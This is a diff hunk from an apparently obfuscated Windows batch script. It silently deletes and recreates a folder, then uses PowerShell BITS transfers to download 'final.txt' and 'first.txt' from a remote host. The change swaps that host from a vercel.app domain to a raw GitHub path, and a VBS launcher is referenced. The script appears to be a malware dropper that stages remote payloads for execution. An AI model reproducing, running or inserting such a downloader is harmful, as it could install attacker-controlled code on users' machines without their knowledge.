@@ -9,7 +9,7 @@ set "v6=%q1%\strt_n.vbs"
 if exist "%q1%" rmdir /s /q "%q1%" 2>nul
 timeout /t 3 /nobreak >nul
 mkdir "%q1%"
-set "d1=service-omega-snowy.vercel.app"
+set "d1=raw.githubusercontent.com/USATIKTOKER/Service/main"
 powershell -Command "$d1='%d1%';Start-BitsTransfer -Source ('https://{0}/final.txt' -f $d1) -Destination '%r2%'"
 timeout /t 2 /nobreak >nul
 powershell -Command "$d1='%d1%';Start-BitsTransfer -Source ('https://{0}/first.txt' -f $d1) -Destination '%s3%'"
